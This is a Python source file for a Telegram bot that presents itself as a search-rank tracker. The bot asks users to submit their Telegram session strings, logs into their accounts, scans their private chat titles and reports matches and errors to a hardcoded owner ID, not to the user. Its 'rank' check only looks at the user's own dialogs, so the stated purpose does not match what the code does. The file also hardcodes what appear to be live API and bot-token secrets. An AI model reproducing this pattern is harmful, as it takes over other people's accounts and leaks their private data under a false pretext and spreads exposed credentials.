from pyrogram import Client, filters
import asyncio

# Dictionary to store user session data
sessions = {}

# Bot configuration
API_ID = "26416419"
API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"
BOT_TOKEN = "8110430281:AAHsiaseMxAqoUBs_M5eU0LE3NAEmVEBob0"
OWNER_ID = 7072373613  # Replace with your Telegram ID

bot = Client("rank_tracker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("session"))
async def login_session(client, message):
    user_id = message.from_user.id
    if user_id in sessions:
        return await message.reply("You are already logged in. Use /cancel to stop tracking.")

    session_string = message.text.split(" ", 1)[1] if len(message.text.split()) > 1 else None
    if not session_string:
        return await message.reply("Please provide a session string: `/session {session_string}`")

    user_client = Client(f"user_{user_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
    try:
        await user_client.start()
        sessions[user_id] = {"client": user_client, "keyword": None, "target_bot": None}
        await message.reply("✅ Session started successfully!\n\n🔍 Now, send me the keyword you want to track.")
    except Exception as e:
        await message.reply(f"❌ Failed to start session: {e}")

@bot.on_message(filters.text & filters.private)
async def handle_user_input(client, message):
    user_id = message.from_user.id
    user_data = sessions.get(user_id)
    if not user_data:
        return

    if user_data["keyword"] is None:
        user_data["keyword"] = message.text
        await message.reply(f"🔍 Tracking started for keyword: **{message.text}**.\n\nNow, send me the **bot username** you want to track.")
    
    elif user_data["target_bot"] is None:
        user_data["target_bot"] = message.text
        await message.reply(f"✅ Tracking bot ranking for: **{message.text}**.\nYou will be notified when it ranks up.")
        
        # Start automatic tracking
        asyncio.create_task(monitor_keyword(user_id))
        asyncio.create_task(monitor_rank(user_id))

async def monitor_keyword(user_id):
    """Continuously searches for the keyword and notifies the owner."""
    user_data = sessions.get(user_id)
    if not user_data:
        return
    
    client = user_data["client"]
    keyword = user_data["keyword"]
    
    while user_id in sessions and keyword:
        try:
            async for dialog in client.iter_dialogs():
                if keyword.lower() in dialog.chat.title.lower():
                    await bot.send_message(OWNER_ID, f"✅ **Keyword found:** {dialog.chat.title}")
            await asyncio.sleep(60)  # Search every 60 seconds
        except Exception as e:
            await bot.send_message(OWNER_ID, f"❌ Error in keyword search: {e}")
            break

async def monitor_rank(user_id):
    """Continuously checks if the target bot appears in search results."""
    user_data = sessions.get(user_id)
    if not user_data:
        return
    
    client = user_data["client"]
    target_bot = user_data["target_bot"]
    
    while user_id in sessions and target_bot:
        try:
            async for dialog in client.iter_dialogs():
                if target_bot.lower() in dialog.chat.title.lower():
                    await bot.send_message(OWNER_ID, f"🎉 **Your bot `{target_bot}` is ranking now!** 🚀")
            await asyncio.sleep(60)  # Check every 60 seconds
        except Exception as e:
            await bot.send_message(OWNER_ID, f"❌ Error in rank tracking: {e}")
            break

@bot.on_message(filters.command("track"))
async def track_keyword(client, message):
    """Manually searches for the keyword and returns results."""
    user_id = message.from_user.id
    user_data = sessions.get(user_id)
    if not user_data:
        return await message.reply("❌ You need to start a session first using `/session {session}`")

    keyword = message.text.split(" ", 1)[1] if len(message.text.split()) > 1 else None
    if not keyword:
        return await message.reply("⚠️ Please provide a keyword: `/track {keyword}`")

    await message.reply(f"🔎 Searching for **{keyword}**...")
    
    client = user_data["client"]
    results = []
    async for dialog in client.iter_dialogs():
        if keyword.lower() in dialog.chat.title.lower():
            results.append(dialog.chat.title)
    
    if results:
        await message.reply("✅ **Found results:**\n" + "\n".join(results))
    else:
        await message.reply("❌ No results found.")

@bot.on_message(filters.command("cancel"))
async def cancel_tracking(client, message):
    """Stops tracking and removes the session."""
    user_id = message.from_user.id
    if user_id in sessions:
        sessions.pop(user_id)
        await message.reply("✅ Tracking cancelled and session stopped.")
    else:
        await message.reply("⚠️ No active tracking found.")

bot.run()
